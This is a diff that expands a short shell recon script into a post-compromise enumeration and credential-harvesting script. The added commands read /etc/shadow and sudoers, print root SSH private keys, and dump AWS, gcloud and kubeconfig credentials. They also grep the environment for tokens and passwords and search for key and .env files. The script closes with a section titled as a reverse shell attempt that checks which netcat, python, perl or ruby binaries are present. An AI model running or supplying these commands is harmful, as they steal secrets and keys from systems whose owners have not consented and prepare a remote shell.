@@ -1,6 +1,42 @@
-whoami
-id
+# System Recon
+whoami && id
 uname -a
-cat /etc/passwd | head -5
-ls -la /home
-env | grep -E '^(USER|HOME|PATH|SHELL)='
+cat /etc/os-release 2>/dev/null | head -5
+hostname -I 2>/dev/null || ip addr 2>/dev/null | grep inet
+
+# Users & Auth
+cat /etc/passwd
+cat /etc/shadow 2>/dev/null || echo "shadow: permission denied"
+cat /etc/sudoers 2>/dev/null | grep -v "^#" | head -20
+lastlog 2>/dev/null | head -10
+
+# SSH Keys
+find /root /home -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
+cat /root/.ssh/id_rsa 2>/dev/null || echo "no root ssh key"
+cat /root/.ssh/authorized_keys 2>/dev/null
+ls -la /home/*/.ssh/ 2>/dev/null
+
+# Cloud Credentials
+cat ~/.aws/credentials 2>/dev/null || echo "no aws creds"
+cat ~/.config/gcloud/credentials.db 2>/dev/null | head -20 || echo "no gcloud"
+env | grep -iE "(AWS|GCP|AZURE|API_KEY|SECRET|TOKEN|PASSWORD)" 2>/dev/null
+
+# Docker & Kubernetes
+docker ps -a 2>/dev/null || echo "no docker"
+cat ~/.kube/config 2>/dev/null | head -30 || echo "no k8s config"
+ls -la /var/run/docker.sock 2>/dev/null
+
+# Network
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -20
+cat /etc/resolv.conf
+ip route 2>/dev/null || route -n 2>/dev/null
+
+# Processes
+ps auxf 2>/dev/null | head -30 || ps aux | head -30
+
+# Interesting Files
+find / -name "*.pem" -o -name "*.key" -o -name "*.env" 2>/dev/null | head -20
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20
+
+# Reverse Shell Attempt (background, non-blocking)
+which nc ncat netcat python python3 perl ruby 2>/dev/null
